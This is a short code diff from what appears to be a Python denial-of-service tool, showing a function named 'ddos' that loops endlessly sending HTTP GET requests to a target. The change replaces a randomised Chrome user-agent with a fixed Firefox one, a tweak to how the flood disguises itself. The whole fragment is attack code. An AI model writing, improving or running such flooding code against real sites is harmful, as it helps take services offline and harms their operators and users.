@@ -22,7 +22,7 @@ logo()
 def ddos(target, data):
     while True:
         try:
-            headers = {'User-Agent': UserAgent().chrome}
+            headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'}
             res = requests.get(target, headers=headers, data=data)
             r = str(res.status_code)
             if r[0] == str(1):
